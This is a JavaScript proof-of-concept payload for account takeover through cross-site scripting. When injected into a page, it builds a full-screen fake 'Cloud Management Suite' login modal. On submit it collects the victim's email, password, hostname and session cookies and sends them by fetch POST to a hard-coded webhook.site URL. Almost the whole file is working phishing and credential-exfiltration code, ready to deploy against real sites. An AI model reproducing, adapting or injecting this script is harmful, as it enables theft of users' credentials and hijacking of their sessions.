// PoC script for demonstrating ATO via XSS - injects a fake login modal and exfiltrates credentials
// Replace 'https://your-webhook.site/url-here' with your actual webhook URL for testing

function createLoginModal() {
  // Create overlay
  const overlay = document.createElement('div');
  overlay.style.position = 'fixed';
  overlay.style.top = '0';
  overlay.style.left = '0';
  overlay.style.width = '100%';
  overlay.style.height = '100%';
  overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.5)';
  overlay.style.zIndex = '9999';
  overlay.style.display = 'flex';
  overlay.style.alignItems = 'center';
  overlay.style.justifyContent = 'center';

  // Create modal container
  const modal = document.createElement('div');
  modal.style.backgroundColor = '#ffffff';
  modal.style.padding = '40px';
  modal.style.borderRadius = '8px';
  modal.style.boxShadow = '0 4px 20px rgba(0, 0, 0, 0.2)';
  modal.style.width = '400px';
  modal.style.maxWidth = '90%';
  modal.style.textAlign = 'center';

  // Logo or title
  const title = document.createElement('h2');
  title.textContent = 'Cloud Management Suite - Login';
  title.style.color = '#333';
  title.style.marginBottom = '20px';
  modal.appendChild(title);

  // QR code mention (simulated, since no actual QR)
  const qrText = document.createElement('p');
  qrText.textContent = 'Use 25Space across any device on the go. Scan the QR code to continue on other devices.';
  qrText.style.color = '#666';
  qrText.style.marginBottom = '20px';
  modal.appendChild(qrText);

  // Fake QR code placeholder (you can replace with actual image if needed)
  const qrPlaceholder = document.createElement('div');
  qrPlaceholder.style.width = '150px';
  qrPlaceholder.style.height = '150px';
  qrPlaceholder.style.backgroundColor = '#eee';
  qrPlaceholder.style.margin = '0 auto 20px';
  qrPlaceholder.style.border = '1px solid #ddd';
  qrPlaceholder.textContent = 'QR Code Placeholder';
  qrPlaceholder.style.display = 'flex';
  qrPlaceholder.style.alignItems = 'center';
  qrPlaceholder.style.justifyContent = 'center';
  qrPlaceholder.style.fontSize = '12px';
  qrPlaceholder.style.color = '#999';
  modal.appendChild(qrPlaceholder);

  // Form
  const form = document.createElement('form');
  form.style.display = 'flex';
  form.style.flexDirection = 'column';

  // Email input
  const emailLabel = document.createElement('label');
  emailLabel.textContent = 'Email';
  emailLabel.style.textAlign = 'left';
  emailLabel.style.marginBottom = '5px';
  emailLabel.style.color = '#333';
  form.appendChild(emailLabel);

  const emailInput = document.createElement('input');
  emailInput.type = 'email';
  emailInput.placeholder = 'Enter your email';
  emailInput.required = true;
  emailInput.style.padding = '10px';
  emailInput.style.marginBottom = '15px';
  emailInput.style.border = '1px solid #ddd';
  emailInput.style.borderRadius = '4px';
  form.appendChild(emailInput);

  // Password input
  const passLabel = document.createElement('label');
  passLabel.textContent = 'Password';
  passLabel.style.textAlign = 'left';
  passLabel.style.marginBottom = '5px';
  passLabel.style.color = '#333';
  form.appendChild(passLabel);

  const passInput = document.createElement('input');
  passInput.type = 'password';
  passInput.placeholder = 'Enter your password';
  passInput.required = true;
  passInput.style.padding = '10px';
  passInput.style.marginBottom = '20px';
  passInput.style.border = '1px solid #ddd';
  passInput.style.borderRadius = '4px';
  form.appendChild(passInput);

  // Submit button
  const submitBtn = document.createElement('button');
  submitBtn.type = 'submit';
  submitBtn.textContent = 'Login';
  submitBtn.style.backgroundColor = '#007bff';
  submitBtn.style.color = '#fff';
  submitBtn.style.padding = '10px';
  submitBtn.style.border = 'none';
  submitBtn.style.borderRadius = '4px';
  submitBtn.style.cursor = 'pointer';
  form.appendChild(submitBtn);

  // Handle form submit
  form.addEventListener('submit', function(e) {
    e.preventDefault();
    const creds = {
      email: emailInput.value,
      password: passInput.value,
      domain: window.location.hostname,
      cookies: document.cookie
    };

    // Send to webhook
    fetch('https://webhook.site/c47a99a0-d241-401a-888d-e44e31dbb274', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(creds)
    }).then(() => {
      // After sending, close modal and maybe redirect or alert
      overlay.remove();
      // Optional: window.location.reload(); or redirect to real login
    }).catch(err => console.error(err));
  });

  modal.appendChild(form);
  overlay.appendChild(modal);
  document.body.appendChild(overlay);
}

// Trigger the modal
createLoginModal();
